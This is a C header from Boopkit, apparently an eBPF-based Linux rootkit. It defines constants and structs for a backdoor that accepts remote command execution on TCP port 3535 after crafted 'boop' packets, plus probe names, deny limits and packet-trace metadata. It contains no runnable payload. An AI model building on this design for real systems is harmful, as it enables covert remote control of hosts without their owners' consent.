// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//

#ifndef BOOPKIT_BOOPKIT_H
#define BOOPKIT_BOOPKIT_H

// MAX_RCE_SIZE is the maximum size of a boop command to execute.
#define MAX_RCE_SIZE 1024
#define MAX_MTU_PACKET_LIMIT 1024

#define EVENT_SRC_BAD_CSUM 1
#define EVENT_SRC_RECEIVE_RESET 2
#define EVENT_SRC_XDP 3

// event_boop_t represents an event from the kernel.
//
// We will pass as much data up to userspace as possible.
// The convention is to not mutate the data in the eBPF probe
// but rather translate the data to userspace as quickly as possible.
//
// The userspace component will be responsible for making sense
// of whatever data is transferred in an event.
//
// NOTE: All event_boop_t fields MUST be used in a probe in order
// to pass the eBPF verifier!
struct event_boop_t {
  // saddr is 28 fucking bytes
  __u8 saddr[28];

  // an enumerated type of EVENT_SRC_* from above
  int event_src_code;
};

// VERSION is the semantic version of the program
#define VERSION "1.1.2"

// PORT for the boopkit TCP protocol for boopscript RCE
#define PORT 3535

// MAX_DENY_ADDRS is the maximum amount of address that can be denied.
#define MAX_DENY_ADDRS 1024

#define MAX_ENTRIES_CPU 256

// MAX_PORT_STR is the port size for rport and lport
#define MAX_PORT_STR 32

// PROBE_BOOP is the eBPF probe to listen for boops
#define PROBE_BOOP "pr0be.boop.o"
#define PROBE_SAFE "pr0be.safe.o"
#define PROBE_XDP "pr0be.xdp.o"

// TIMEOUT_SECONDS_RECVRCE is the amount of seconds to wait for recvrce()
// after a boop
#define TIMEOUT_SECONDS_RECVRCE 1

// SPDX-License-Identifier: BSD-3-Clause
#define MAXPIDLEN 10
#define PROG_00 0
#define PROG_01 1
#define PROG_02 2

#define FILENAME_LEN_MAX 50
#define TEXT_LEN_MAX 20

#define TASK_COMM_LEN 16
struct event {
  int pid;
  char comm[TASK_COMM_LEN];
  bool success;
};

struct tr_file {
  char filename[FILENAME_LEN_MAX];
  unsigned int filename_len;
};

struct tr_text {
  char text[TEXT_LEN_MAX];
  unsigned int text_len;
};

struct trace_configuration {
  __u32 capture_if_ifindex;
  __u32 capture_snaplen;
  __u32 capture_prog_index;
};

#define MDF_DIRECTION_FEXIT 1

struct pkt_trace_metadata {
  __u32 ifindex;
  __u32 rx_queue;
  __u16 pkt_len;
  __u16 cap_len;
  __u16 flags;
  __u16 prog_index;
  int action;
} __packed;

#endif  // BOOPKIT_BOOPKIT_H
